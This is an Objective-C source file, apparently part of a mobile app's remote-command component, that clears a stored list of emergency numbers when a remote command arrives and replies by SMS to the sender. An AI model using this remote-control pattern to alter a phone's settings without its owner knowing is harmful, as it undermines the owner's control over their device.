/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearEmergencyNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearEmergencyNumberProcessor.h"
#import "PrefEmergencyNumber.h"
#import "Preference.h"

@interface ClearEmergencyNumberProcessor (PrivateAPI)
- (void) processClearEmergencyNumber;
- (void) sendReplySMS;
@end

@implementation ClearEmergencyNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearEmergencyNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearEmergencyNumberProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearEmergencyNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor  Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearEmergencyNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearEmergencyNumberProcessor--->doProcessingCommand")
 	[self processClearEmergencyNumber];
}

#pragma mark ClearEmergencyNumberProcessor PrivateAPI Methods

/**
 - Method name: processClearEmergencyNumber
 - Purpose:This method is used to process clear emergency number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearEmergencyNumber {
	DLog (@"ClearEmergencyNumberProcessor--->processClearEmergencyNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	NSMutableArray *emergencyNumberList=[[NSMutableArray alloc] init];
	[prefEmergencyNumberList setMEmergencyNumbers:emergencyNumberList];
	[prefManager savePreferenceAndNotifyChange:prefEmergencyNumberList];
	[emergencyNumberList release];
	[self sendReplySMS];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearEmergencyNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
